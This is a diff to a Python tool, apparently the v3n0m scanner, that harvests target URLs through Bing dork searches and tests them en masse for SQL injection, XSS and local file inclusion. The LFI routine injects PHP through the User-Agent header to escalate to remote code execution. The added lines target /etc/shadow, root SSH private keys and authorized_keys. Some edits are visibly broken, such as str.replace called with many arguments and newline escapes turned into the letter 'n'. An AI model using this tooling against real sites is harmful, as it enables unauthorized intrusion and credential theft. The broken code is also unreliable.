@@ -68,7 +68,7 @@ except:
 # Banner
 def logo():
     print(R + "\n|----------------------------------------------------------------|")
-    print("| Release Date 07/10/2016                                        |")
+    print("| Release Date 12/10/2016                                        |")
     print("|                                                                |")
     print("|        Proxy Enabled " + G + " [",ProxyEnabled,"] " + R + "                               |")
     print("|                                                                |")
@@ -153,35 +153,38 @@ class xssthread(threading.Thread):
 
 # noinspection PyBroadException
 def classiclfi(url):
-    lfiurl = url.rsplit('=', 1)[0]
-    if lfiurl[-1] != "=":
-        lfiurl += "="
-    for lfi in lfis:
-        try:
-            check = urllib.request.urlopen(lfiurl + lfi.replace("\n", "")).read()
-            if re.findall(str('root:x'), check):
-                print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
-                lfi_log_file.write("\n" + lfiurl + lfi)
-                vuln.append(lfiurl + lfi)
-                target = lfiurl + lfi
-                target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
-                header = "<? echo md5(NovaCygni); ?>"
-                try:
-                    request_web = urllib.request.Request(target)
-                    request_web.add_header('User-Agent', header)
-                    request_web.add_header = [("connection", "keep-alive"), "Cookie"]
-                    text = urllib.request.urlopen(request_web)
-                    text = text.read()
-                    if re.findall(str('7ca328e93601c940f87d01df2bbd1972'), text):
-                        print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
-                        rce_log_file.write('target\n')
-                        vuln.append(target)
-                except:
-                    pass
-
-        except:
-            pass
-
+  lfiurl = url.rsplit('=', 1)[0]
+  if lfiurl[-1] != "=":
+      lfiurl += "="
+  for lfi in lfis:
+    try:
+         check = urllib.request.urlopen(lfiurl+lfi.replace("n", "")).read()
+         if re.findall("root:x", check):
+            print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
+            lfi_log_file.write("n"+lfiurl+lfi)
+            vuln.append(lfiurl+lfi)
+            target = lfiurl+lfi
+            target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00", "../../../../../etc/passwd%00",
+                                    "/etc/shadow", "/etc/issue", "/etc/group", "/etc/hostname", "/etc/ssh/ssh_config",
+                                    "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/home/user/.ssh/authorized_keys",
+                                    "/home/user/.ssh/id_rsa", "/etc/apache2/apache2.conf", "/usr/local/etc/apache2/httpd.conf"
+                                    , "/etc/httpd/conf/httpd.conf", "/var/log/apache2/access.log", "/var/log/httpd-access.log",
+                                     "/var/log/httpd/access_log")
+            header = "<? echo md5(NovaCygni); ?>"
+            try:
+                request_web = urllib.request.Request(target)
+                request_web.add_header('User-Agent', header)
+                request_web.add_header = [("connection", "keep-alive"), "Cookie"]
+                text = urllib.request.urlopen(request_web)
+                text = text.read()
+                if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
+                    print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
+                    rce_log_file.write(target)
+                    vuln.append(target)
+            except:
+                pass
+    except:
+        pass
 
 # noinspection PyBroadException
 def classicxss(url):
@@ -252,8 +255,10 @@ def xsstest():
 def classicinj(url):
     aug_url = url + "'"
     try:
-        resp = urllib.request.urlopen(aug_url)
-        cctvcheck = urllib.request.urlopen(url)
+        try:
+            resp = urllib.request.urlopen(aug_url)
+        except:
+            resp = str("v3n0m")
         hits = str(resp.read())
         if str("error in your SQL syntax") in hits:
             print(url + " is vulnerable --> MySQL Classic")
@@ -673,13 +678,13 @@ def vulnscan():
     rce_log_file = open("v3n0m-rce.txt", "a")
     xss_log_file = open("v3n0m-xss.txt", "a")
     endsub = 0
-    print(R + "\n[1] SQLi Testing")
-    print("[2] SQLi Testing Auto Mode")
-    print("[3] LFI - RCE Testing")
+    print(R + "\n[1] SQLi Testing, Will verify the Vuln links and print the Injectable URL to the screen")
+    print("[2] SQLi Testing Auto Mode, Will attempt to Verify vuln sites then Column count if MySQL detected")
+    print("[3] LFI - RCE Testing [!] Broken, Please Wait for fix [!]")
     print("[4] XSS Testing")
-    print("[5] Save valid urls to file")
-    print("[6] Print valid urls")
-    print("[7] Print Found vuln in last scan")
+    print("[5] Save valid Sorted and confirmed vuln urls to file")
+    print("[6] Print all the UNSORTED urls ")
+    print("[7] Print all Sorted and Confirmed Vulns from last scan again")
     print("[8] Back to main menu")
     chce = input(":")
     if chce == '1':
@@ -890,11 +895,11 @@ async def search(pages_pulled_as_one):
                 query = dork + "+site:"
                 futures = []
                 loop = asyncio.get_event_loop()
-                for i in range(20):
+                for i in range(10):
                     results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                         (page + i) * 50 + 1) + "&count=50"
                     futures.append(loop.run_in_executor(None, ignoringGet, results_web))
-                page += 20
+                page += 10
                 stringreg = re.compile('(?<=href=")(.*?)(?=")')
                 names = []
                 for future in futures:
@@ -926,7 +931,7 @@ async def search(pages_pulled_as_one):
                                                   "| Collected urls: %s Since start of scan \n"
                                                    " | D0rks: %s/%s Progressed so far \n"
                                                    " | Percent Done: %s \n"
-                                                   " | Current page no.: <%s> in Cycles of 20 Page results pulled in Asyncio\n"
+                                                   " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
                                                    " | Dork In Progress: %s\n"
                                                    " | Elapsed Time: %s\n" % (R +
                                                                               site, repr(urls_len), dark, darklen,
@@ -1056,11 +1061,11 @@ def fmenu():
 
 signal(SIGINT, killpid)
 d0rk = [line.strip() for line in open("statics/d0rks", 'r', encoding='utf-8')]
-header = [line.strip() for line in open("statics/header", 'r')]
-xsses = [line.strip() for line in open("statics/xsses", 'r')]
-lfis = [line.strip() for line in open("statics/lfi", 'r')]
-tables = [line.strip() for line in open("statics/tables", 'r')]
-columns = [line.strip() for line in open("statics/columns", 'r')]
+header = [line.strip() for line in open("statics/header", 'r', encoding='utf-8')]
+xsses = [line.strip() for line in open("statics/xsses", 'r', encoding='utf-8')]
+lfis = [line.strip() for line in open("statics/lfi", 'r', encoding='utf-8')]
+tables = [line.strip() for line in open("statics/tables", 'r', encoding='utf-8')]
+columns = [line.strip() for line in open("statics/columns", 'r', encoding='utf-8')]
 search_Ignore = str(line.strip() for line in open("statics/search_ignore", 'r', encoding='utf-8'))
 random.shuffle(d0rk)
 random.shuffle(header)
@@ -1160,6 +1165,6 @@ timeout = 14
 file = "/etc/passwd"
 ProxyEnabled=False
 menu = True
-current_version = 410.1
+current_version = 410.2
 while True:
     fmenu()
